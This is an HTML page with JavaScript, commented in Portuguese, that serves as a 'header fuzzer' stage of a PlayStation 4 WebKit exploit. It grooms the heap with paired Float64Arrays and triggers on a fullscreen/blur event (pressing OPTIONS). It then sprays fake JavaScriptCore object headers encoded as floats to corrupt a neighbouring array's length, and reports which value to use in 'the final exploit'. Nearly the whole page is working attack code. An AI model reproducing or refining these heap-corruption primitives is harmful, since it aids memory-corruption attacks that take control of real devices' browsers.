<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Webkit: Header Fuzzer</title>
<style>
    body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; }
    h1 { text-shadow: 0 0 10px #0f0; }
    #log { text-align: left; margin: 20px; border: 1px solid #333; padding: 10px; height: 300px; overflow-y: scroll;}
    .success { color: #fff; background: #00aa00; font-size: 1.5em; padding: 10px; display: block; }
</style>
</head>
<body>

<h1>HEADER HUNTER v1.0</h1>
<div id="status">Status: PRONTO PARA FUZZING</div>
<br>
<button onclick="fire()" style="padding:20px; font-size:1.2em; font-weight:bold; cursor:pointer;">INICIAR CAÇADA</button>
<div id="log">Logs...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += ">> " + txt + "<br>"; Log.scrollTop = Log.scrollHeight;}

    // --- LISTA DE CABEÇALHOS CANDIDATOS (VIP LIST) ---
    // Estes são valores float que, em hex, representam headers válidos com length gigante.
    const CANDIDATES = [
        // 1. O Clássico: Length=0x10000 | Flags=0x10
        // Hex: 0x0001000000000010
        1.3906717577229e-309, 

        // 2. O Agressivo: Length=0x20000 (Dobro)
        // Hex: 0x0002000000000010
        2.7813435154458e-309,

        // 3. O Estrutural: Tenta preservar StructureID baixo
        // Hex: 0x0001000000000000
        1.3906717577225e-309,

        // 4. O "Shifted": As vezes o alinhamento está deslocado
        // Hex: 0x0000001000010000
        2.1729236899484e-311
    ];

    let victims = [];
    let neighbors = [];
    const COUNT = 10000;

    function fire() {
        document.getElementById('status').innerText = "Alocando Memória...";
        log("Iniciando preparação do Heap...");

        // Alocação Vizinho | Vítima
        for(let i=0; i<COUNT; i++) {
            // Vítima (será deletada)
            let v = new Float64Array(16);
            victims.push(v);

            // Vizinho (esperamos corromper o Length deste cara)
            // Preenchemos com 0 para facilitar detecção
            let n = new Float64Array(16);
            n.fill(0); 
            neighbors.push(n);
        }

        log("Heap pronto. Pressione OPTIONS para disparar o Fuzzer.");
        document.getElementById('status').innerText = "APERTE OPTIONS AGORA";

        // Trigger
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("Blur detectado! Disparando Spray Rotativo...");

            // 1. FREE
            victims = null;

            // 2. SPRAY INTELIGENTE
            // Vamos criar arrays que usam os Candidatos em rotação.
            let spray = [];
            try {
                for(let i=0; i<COUNT*2; i++) {
                    // Tamanho 24 para garantir overflow
                    let s = new Float64Array(24);
                    
                    // Escolhe um candidato da lista baseado no índice
                    // Isso garante que testamos TODOS os headers na mesma execução
                    let header_guess = CANDIDATES[i % CANDIDATES.length];
                    
                    // Enche o array com esse candidato
                    // Assim, onde quer que o overflow bata, vai escrever esse header
                    s.fill(header_guess);
                    
                    spray.push(s);
                }
            } catch(e) {}

            // 3. VERIFICAÇÃO
            checkResults();
        };
    }

    function checkResults() {
        log("Verificando se algum Length mudou...");
        let success = false;

        for(let i=0; i<COUNT; i++) {
            // O tamanho original é 16.
            // Se for diferente, conseguimos!
            if(neighbors[i].length !== 16) {
                success = true;
                document.body.style.background = "#000088";
                
                let msg = "SUCESSO! Header encontrado!";
                Log.innerHTML += `<span class="success">${msg}</span>`;
                log("Vizinho Index: " + i);
                log("Novo Length: " + neighbors[i].length);
                log("Use o valor hexadecimal correspondente no seu exploit final.");
                return;
            }
        }

        if(!success) {
            log("[-] Falha. Nenhum header funcionou desta vez.");
            log("O console não crashou? Então tente adicionar mais candidatos na lista.");
            document.body.style.background = "#330000";
        }
    }
</script>
</body>
</html>
